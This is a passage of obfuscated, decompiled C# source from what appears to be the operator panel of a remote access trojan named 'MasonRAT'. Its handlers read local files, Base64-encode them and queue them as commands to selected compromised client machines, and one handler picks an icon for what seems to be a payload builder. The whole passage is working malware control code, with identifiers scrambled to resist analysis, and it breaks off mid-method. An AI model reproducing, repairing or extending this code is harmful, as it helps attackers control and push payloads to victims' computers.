        strArray[((-70334629 ^ 1125364788 >> 383941732) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + ((-2117274389 - 1123333087 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) >> ((701188830 > 1567835299 ? 1152047002 : 864035252) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(1304351455 - 1304550222 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((1628355004 + (980280984 << 754713790) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) >> -1754893378 - 859206353 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = Path.GetExtension(openFileDialog.FileName);
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cحٽڠــﻋڝ\u0608د\u060A\u060Eـۙ(object sender, EventArgs e)
  {
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.Items.Clear();
  }

  private void \u2694️MasonRAT\u270C\u060Cڜ\u060Aٽـڞبـۨۛﻼـ̍ٺٺـټ\u0020حط(object sender, EventArgs e)
  {
    this.\u2694️MasonRAT\u270C\u060Dةﮪ\u0609ـټ\u0609ْ\u0609̍ــ.SelectedIndex = (630465347 ^ -254574444) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + (1117941593 - 401216300 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0;
  }

  private void \u2694️MasonRAT\u270Cڙؤﻻـٻڙـىـــ\u060F\u0609(object sender, MouseEventArgs e)
  {
    if (this.\u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E.Checked)
    {
      OpenFileDialog openFileDialog1 = new OpenFileDialog();
      OpenFileDialog openFileDialog2 = openFileDialog1;
      openFileDialog2.Title = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1864);
      openFileDialog2.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1865);
      openFileDialog2.InitialDirectory = Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1866);
      if (openFileDialog1.ShowDialog() == DialogResult.OK)
      {
        if (openFileDialog1.FileName.EndsWith(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1867)))
        {
          this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ = EXEICO.\u2694️MasonRAT\u270Cۭــ\u060Aۏـڦط\u060Dـ(openFileDialog1.FileName);
          this.\u2694️MasonRAT\u270Cۙ\u060A\u0609ــٺ\u060C؁ؤڜـحـ\u060Eح.ImageLocation = this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ;
          GC.Collect();
        }
        else
        {
          this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ = openFileDialog1.FileName;
          this.\u2694️MasonRAT\u270Cۙ\u060A\u0609ــٺ\u060C؁ؤڜـحـ\u060Eح.ImageLocation = this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ;
        }
      }
      else
      {
        this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ = (string) null;
        this.\u2694️MasonRAT\u270Cۙ\u060A\u0609ــٺ\u060C؁ؤڜـحـ\u060Eح.Image = (Image) null;
        this.\u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E.Checked = false;
      }
    }
    if (this.\u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E.Checked)
      return;
    this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ = (string) null;
    this.\u2694️MasonRAT\u270Cۙ\u060A\u0609ــٺ\u060C؁ؤڜـحـ\u060Eح.Image = (Image) null;
    this.\u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E.Checked = false;
  }

  private void \u2694️MasonRAT\u270Cـ\u0608ـ\u060Aـب\u060Aۏـ\u0609\u060Aؤح\u060Aـڙ(
    object sender,
    MouseEventArgs e)
  {
    if (this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked)
    {
      OpenFileDialog openFileDialog1 = new OpenFileDialog();
      OpenFileDialog openFileDialog2 = openFileDialog1;
      openFileDialog2.Title = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1868);
      openFileDialog2.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1869);
      if (openFileDialog1.ShowDialog() == DialogResult.OK)
      {
        this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609 = openFileDialog1.FileName;
        this.\u2694️MasonRAT\u270C\u060Aٺۭ̍ﻻ\u060Dڕـژــڞـٺـٸڟ.Text = Path.GetFileName(this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609);
        this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked = true;
      }
      else
      {
        this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609 = (string) null;
        this.\u2694️MasonRAT\u270C\u060Aٺۭ̍ﻻ\u060Dڕـژــڞـٺـٸڟ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1870);
        this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked = false;
      }
    }
    if (this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked)
      return;
    this.\u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609 = (string) null;
    this.\u2694️MasonRAT\u270C\u060Aٺۭ̍ﻻ\u060Dڕـژــڞـٺـٸڟ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1871);
    this.\u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608.Checked = false;
  }

  private void \u2694️MasonRAT\u270Cـ\u060Cـۛ\u0020ـد\u060C\u060D\u060Aٺ\u0609\u060B(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cئۭٽ\u060Dـﻋــڙ\u060A(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1872) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1873))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cڙ\u0020ــــٸ\u060Dڣ\u0609\u0608ــ\u060C(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[(761889795 + (1224262720 << 1226157637) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (-1402860742 - (1591738172 | 1603569460) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1874);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(-1715159835 - 157716694 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (1872876539 - (278033470 >> 129092985) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1875)));
      strArray[(917276507 + ~917530171 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (1690951744 + 387099243 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 >> (1150563737 - 692642764 % 1096980090 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((1068609986 | 1540126831) - 2147349144 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ (245839509 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> (110066913 + (477825050 >> 622120332) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1876);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـح\u060Fـ\u060Dـۚٺٽ\u0608\u060Cټ\u060Fـد\u060D(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[(12617487 - 848675477 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - -((-1722673720 ^ -1467535805) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1877);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(1000693505 - -1044776130 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (296357465 + 1749112168 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1878)));
      strArray[((-1690466514 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ ~(1442661862 + 247804639 % 1754875536 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((-1304598511 ^ -1304598508) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (2097477888 + -1700762349 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 >> (-1506056321 - 1598597123 % 2132748346 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1879);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـﻋؤۧ\u0609ۙـڠۙ\u060Cـ\u0609ۭ\u0608ـﻋام(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1880) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1881))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ﻼټټـٻڙـڜﻋ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
